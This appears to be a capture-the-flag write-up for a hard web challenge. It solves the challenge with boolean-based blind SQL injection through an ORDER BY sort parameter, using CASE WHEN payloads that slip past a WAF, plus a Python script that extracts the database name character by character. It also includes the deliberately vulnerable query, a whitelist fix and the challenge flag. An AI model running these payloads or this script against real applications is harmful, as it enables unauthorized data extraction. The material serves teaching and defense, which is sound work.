# OrderBy Nightmare - CTF Writeup

## Challenge Information

- **Name:** OrderBy Nightmare
- **Category:** Web Exploitation
- **Difficulty:** Hard
- **Points:** 275
- **Flag:** `CTF{0rd3r_by_ch40s_1nj3ct10n_m4st3r}`

## Challenge Description

A blog application with sorting functionality has a WAF blocking common SQL injection patterns. Exploit the `sort` parameter to extract the database name containing the flag.

**URL:** `https://ctf.hackelite.app/challenges/1/34`

## Vulnerability Analysis

### Attack Surface

The sort parameter is directly used in SQL ORDER BY clause:

```javascript
// Vulnerable code
const sql = `SELECT * FROM posts ORDER BY ${sort}`;
```

Testing basic SQLi triggers WAF:
```
?sort=title' OR '1'='1  → 403 Forbidden (WAF_BLOCK)
```

**WAF blocks:** `UNION`, `SELECT`, `--`, `/**/`, `sqlite_master`, `;`, and other common patterns.

## Exploitation: Boolean-Based Blind SQLi

### The Technique

ORDER BY accepts conditional expressions that bypass WAF:

```sql
ORDER BY (CASE WHEN condition THEN title ELSE views END)
```

**Why this works:**
- No `UNION`, `SELECT`, or comments required
- Uses legitimate SQL syntax (CASE WHEN)
- Boolean-based: observe different post ordering based on condition truth

### Step-by-Step Exploitation

**Step 1:** Verify injection works
```
?sort=(CASE WHEN 1=1 THEN title ELSE views END)
```
Posts sorted by title → Injection confirmed!

**Step 2:** Access database metadata via `pragma_database_list`
```
?sort=(CASE WHEN (SELECT name FROM pragma_database_list LIMIT 1) LIKE 'C%' THEN title ELSE views END)
```
Posts sorted by title → Database name starts with 'C'

**Step 3:** Extract character-by-character
```python
import requests
import string

url = "" # get this respective info
database_name = "" # get this respective info

for pos in range(1, 50):
    for char in string.ascii_letters + string.digits + "{}_":
        payload = f"(CASE WHEN SUBSTR((SELECT name FROM pragma_database_list WHERE seq=0),{pos},1)='{char}' THEN title ELSE views END)"
        r = requests.get(url, params={"sort": payload})
        
        if r.status_code == 200:
            # Check if ordering changed (sorted by title = true condition)
            default = requests.get(url).json()[0]['title']
            if r.json()[0]['title'] != default:
                database_name += char
                print(f"[+] Found: {database_name}")
                break
    else:
        break

print(f"\n[!] Flag: {database_name.replace('.db', '')}")
```

**Step 4:** Verify complete flag
```
?sort=(CASE WHEN (SELECT name FROM pragma_database_list WHERE seq=0) LIKE 'CTF{0rd3r_by_ch40s_1nj3ct10n_m4st3r}.db' THEN title ELSE views END)
```
Posts sorted by title → Flag confirmed!

**Flag:** `CTF{0rd3r_by_ch40s_1nj3ct10n_m4st3r}`

## Key Takeaways

**Vulnerability:** Unsanitized user input in SQL ORDER BY clause enables blind SQLi

**Attack Technique:**
- Boolean-based blind SQLi using CASE WHEN expressions
- Bypasses WAF by using legitimate SQL syntax
- Extracts data through observable side effects (post ordering)

**Defense:**
```javascript
// Whitelist approach (REQUIRED)
const allowedFields = ['title', 'views', 'created'];
const sortField = allowedFields.includes(sort) ? sort : 'created';
const sql = `SELECT * FROM posts ORDER BY ${sortField}`;
```

**Lessons:**
- SQLi isn't limited to WHERE clauses - ORDER BY is vulnerable too
- WAFs can be bypassed with creative, syntactically valid SQL
- Boolean-based blind SQLi works when errors are hidden
- Always whitelist user input, even for "safe" parameters

**Tools:** Browser DevTools, Python + requests, Burp Suite (optional)

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLite pragma_database_list](https://www.sqlite.org/pragma.html#pragma_database_list)
- [Blind SQL Injection Techniques](https://portswigger.net/web-security/sql-injection/blind)

---

**Author:** CTF Challenge Team | **Date:** February 2026 | **Difficulty:** ⭐⭐⭐⭐☆
